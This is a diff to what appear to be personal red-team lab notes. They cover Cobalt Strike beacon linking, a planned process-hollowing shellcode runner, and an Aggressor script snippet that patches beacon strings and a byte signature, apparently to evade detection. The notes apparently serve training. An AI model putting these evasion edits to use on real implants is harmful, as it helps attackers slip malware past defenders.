@@ -211,5 +211,26 @@ The beacons of these listeners don’t need to talk to the C2 directly, they can
 
 - [ ] Tester avec full Crystal-Kit last version github sur les labs
 - [ ] Faire un nouveau shellcode runner (process hollowing ou APC en .NET), le tester en condition réelle sur la VM avec service csvc.exe et ysoserial
-- [ ] Tester dans le lab les exploits mssql avec beacon smb/tcp listener avec connect/link
+- [x] Tester dans le lab les exploits mssql avec beacon smb/tcp listener avec connect/link
 - [ ] Relire les 4 points perdus et chercher ce qui a pu causer ces erreurs
+
+# Notes
+
+- `execute-assembly` -> BYOWD
+- Beacon smb/tcp -> link/connect
+
+
+# Preperation
+- `scp root@157.90.29.76:/tmp/Crystal-Kit-main.zip C:\Tools\`
+- Faire toutes les modifs dans crystalkit.cna (strrep_pad)
+
+Inside the **BEACON_RDLL_GENERATE** hook, insert the following code after the "x86 warning":
+```
+# replace some common strings
+$beacon = strrep_pad ( $beacon, "beacon.x64.dll", "bacon.x64.dll" );
+$beacon = strrep_pad ( $beacon, "%02d/%02d/%02d", "%02d/%02d/%04d" );
+$beacon = strrep_pad ( $beacon, "%s as %s\%s: %d", "%s - %s\%s (%d)" );
+$beacon = strrep_pad ( $beacon, "\x48\x89\x5C\x24\x08\x57\x48\x83\xEC\x20\x48\x8B\x59\x10\x48\x8B\xF9\x48\x8B\x49\x08\xFF\x17\x33\xD2\x41\xB8\x00\x80\x00\x00", "\x48\x89\x5C\x24\x08\x57\x48\x83\xEC\x20\x48\x8B\x59\x10\x48\x8B\xF9\x48\x8B\x49\x08\xFF\x17\x33\xD2\x41\xB8\x01\x80\x00\x00" );
+```
+
+- Load `C:\Tools\Crystal-Kit-main\crystalkit.cna`
